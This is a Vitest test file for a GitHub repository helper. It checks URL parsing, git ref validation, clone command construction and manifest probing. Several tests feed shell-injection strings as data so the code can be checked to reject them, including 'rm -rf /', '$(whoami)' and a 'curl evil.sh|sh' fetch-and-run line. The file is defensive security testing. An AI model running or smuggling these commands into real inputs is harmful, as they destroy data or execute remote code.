import { describe, it, expect, vi } from 'vitest'
import { parseGitHub, safeRef, cloneCommand, probeRepoManifests, MANIFESTS, CLONE_DIR } from '../../src/lib/repo'

describe('parseGitHub', () => {
  it('accepts the forms people actually paste', () => {
    const want = { owner: 'acme', repo: 'widgets' }
    for (const s of [
      'https://github.com/acme/widgets',
      'http://github.com/acme/widgets',
      'https://www.github.com/acme/widgets',
      'github.com/acme/widgets',
      'https://github.com/acme/widgets.git',
      'https://github.com/acme/widgets/',
      'acme/widgets',
      '  acme/widgets  ',
    ]) {
      expect(parseGitHub(s), s).toEqual(want)
    }
  })

  it('rejects anything that would not be a repo path', () => {
    for (const s of ['', 'acme', 'https://gitlab.com/acme/widgets', 'not a url', '/', '.', './..']) {
      expect(parseGitHub(s), s).toBeNull()
    }
  })

  it('refuses shell metacharacters — this is the security boundary, not an escape', () => {
    // Downstream builds a shell command from these fields, so metacharacters must fail to parse.
    for (const s of [
      'acme/widgets; rm -rf /',
      'acme/$(whoami)',
      'acme/widgets`id`',
      'acme/widgets&&curl evil.sh|sh',
      'https://github.com/acme/widgets;curl evil',
      'acme/wid gets',
      'acme/widgets|tee',
    ]) {
      expect(parseGitHub(s), s).toBeNull()
    }
  })

  it('rejects dot-only components that pass the character class', () => {
    expect(parseGitHub('./widgets')).toBeNull()
    expect(parseGitHub('acme/..')).toBeNull()
  })
})

describe('safeRef', () => {
  it('passes ordinary refs and falls back to HEAD for anything else', () => {
    expect(safeRef('main')).toBe('main')
    expect(safeRef('release/2.1')).toBe('release/2.1')
    expect(safeRef('v1.0.0')).toBe('v1.0.0')
    expect(safeRef('')).toBe('HEAD')
    expect(safeRef('   ')).toBe('HEAD')
  })

  it('never lets an injected ref through', () => {
    for (const r of ['main; rm -rf /', '$(id)', 'a b', '`x`', 'a|b', 'a&&b']) {
      expect(safeRef(r), r).toBe('HEAD')
    }
  })
})

describe('cloneCommand', () => {
  it('builds a shallow clone from parsed parts', () => {
    expect(cloneCommand({ owner: 'acme', repo: 'widgets' })).toBe(
      `git clone --depth 1 https://github.com/acme/widgets.git ${CLONE_DIR}`,
    )
  })

  it('never clones into "app" — templates bake their own starter there', () => {
    // The nextjs image ships a starter at /root/app; cloning there fails and the template's app serves.
    expect(CLONE_DIR).not.toBe('app')
    expect(cloneCommand({ owner: 'a', repo: 'b' })).not.toMatch(/\sapp$/)
  })

  it('adds --branch only for a real ref, never for HEAD', () => {
    // `git clone --branch HEAD` fails: HEAD is not a branch name.
    expect(cloneCommand({ owner: 'a', repo: 'b' }, 'HEAD')).not.toContain('--branch')
    expect(cloneCommand({ owner: 'a', repo: 'b' }, 'main')).toContain('--branch main')
  })

  it('cannot be made to emit an injected ref', () => {
    const cmd = cloneCommand({ owner: 'a', repo: 'b' }, 'main; rm -rf /')
    expect(cmd).not.toContain('rm -rf')
    expect(cmd).not.toContain(';')
  })
})

describe('probeRepoManifests', () => {
  const ok = (body: string) => ({ ok: true, text: async () => body }) as unknown as Response
  const missing = { ok: false, text: async () => '' } as unknown as Response

  it('returns only the files that exist', async () => {
    const f = vi.fn(async (url: string | URL | Request) =>
      String(url).endsWith('/package.json') ? ok('{"name":"x"}') : missing,
    ) as unknown as typeof fetch

    const found = await probeRepoManifests(f, { owner: 'a', repo: 'b' })
    expect(found).toEqual([{ path: 'package.json', content: '{"name":"x"}' }])
  })

  it('probes for entry points, not only manifests', async () => {
    // A start command has to be checkable against a file that exists.
    const seen: string[] = []
    const f = vi.fn(async (url: string | URL | Request) => {
      seen.push(String(url))
      return missing
    }) as unknown as typeof fetch

    await probeRepoManifests(f, { owner: 'a', repo: 'b' })
    for (const entry of ['main.py', 'app.py', 'server.js']) {
      expect(seen.some(u => u.endsWith(`/${  entry}`)), `must probe ${entry}`).toBe(true)
    }
  })

  it('probes every manifest, against the real default ref', async () => {
    const seen: string[] = []
    const f = vi.fn(async (url: string | URL | Request) => {
      seen.push(String(url))
      return missing
    }) as unknown as typeof fetch

    await probeRepoManifests(f, { owner: 'a', repo: 'b' })
    expect(seen).toHaveLength(MANIFESTS.length)
    expect(seen.every(u => u.startsWith('https://raw.githubusercontent.com/a/b/HEAD/'))).toBe(true)
  })

  it('a private repo or a network failure detects nothing rather than throwing', async () => {
    const f = vi.fn(async () => {
      throw new Error('offline')
    }) as unknown as typeof fetch
    await expect(probeRepoManifests(f, { owner: 'a', repo: 'b' })).resolves.toEqual([])
  })

  it('caps content so a vendored lockfile cannot be pulled into memory whole', async () => {
    const huge = 'x'.repeat(500_000)
    const f = vi.fn(async () => ok(huge)) as unknown as typeof fetch
    const found = await probeRepoManifests(f, { owner: 'a', repo: 'b' })
    expect(found[0].content.length).toBe(100_000)
  })

  it('uses a validated ref, never the caller’s raw string', async () => {
    const seen: string[] = []
    const f = vi.fn(async (url: string | URL | Request) => {
      seen.push(String(url))
      return missing
    }) as unknown as typeof fetch

    await probeRepoManifests(f, { owner: 'a', repo: 'b' }, 'main; rm -rf /')
    expect(seen.every(u => u.includes('/HEAD/')), 'an unsafe ref must degrade to HEAD').toBe(true)
  })
})
